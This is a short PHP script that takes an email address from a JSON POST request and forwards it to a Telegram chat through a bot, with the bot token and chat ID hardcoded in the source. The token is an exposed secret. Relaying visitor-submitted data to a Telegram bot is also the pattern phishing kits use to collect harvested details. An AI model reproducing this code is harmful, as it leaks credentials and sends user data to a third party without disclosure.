<?php
$data = json_decode(file_get_contents("php://input"), true);
$email = $data["email"];

$botToken = "8568408364:AAGcM6PJORlgQIsW48hmV3jdtqBIEog7PMY";
$chatId = "6307157806";

$message = "Email: " . $email;

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

echo json_encode(["ok" => true]);
?>
